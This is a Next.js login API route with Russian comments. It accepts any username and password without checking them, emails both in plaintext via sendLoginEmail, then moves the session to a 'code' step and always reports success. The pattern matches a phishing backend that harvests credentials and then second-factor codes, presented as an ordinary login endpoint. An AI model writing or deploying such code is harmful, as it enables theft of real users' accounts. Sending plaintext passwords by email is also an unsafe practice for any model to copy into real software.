import { NextRequest, NextResponse } from "next/server";
import { sendLoginEmail } from "@/lib/email";
import { setSession } from "@/lib/session";

/**
 * API endpoint для входа
 * POST /api/auth/login
 */
export async function POST(request: NextRequest) {
  console.log("[API LOGIN] Получен запрос на вход");

  try {
    const body = await request.json();
    const { username, password, rememberUsername } = body;

    console.log("[API LOGIN] Данные:", { username, rememberUsername });

    // Валидация
    if (!username || !password) {
      console.error("[API LOGIN] Отсутствуют обязательные поля");
      return NextResponse.json(
        { error: "Username и Password обязательны" },
        { status: 400 }
      );
    }

    // Отправка Email с логином и паролем
    try {
      await sendLoginEmail(username, password);
      console.log("[API LOGIN] Email с данными входа отправлен");
    } catch (emailError) {
      console.error("[API LOGIN] Ошибка отправки Email:", emailError);
      // Продолжаем выполнение даже если Email не отправился
      // В реальном приложении здесь можно решить, прерывать ли процесс
    }

    // Создание сессии
    await setSession({
      step: "code",
      username: username,
    });

    console.log("[API LOGIN] Сессия создана, вход успешен");

    return NextResponse.json({
      success: true,
      message: "Вход выполнен успешно",
    });
  } catch (error) {
    console.error("[API LOGIN] Ошибка:", error);
    return NextResponse.json(
      {
        error: error instanceof Error ? error.message : "Ошибка при входе",
      },
      { status: 500 }
    );
  }
}


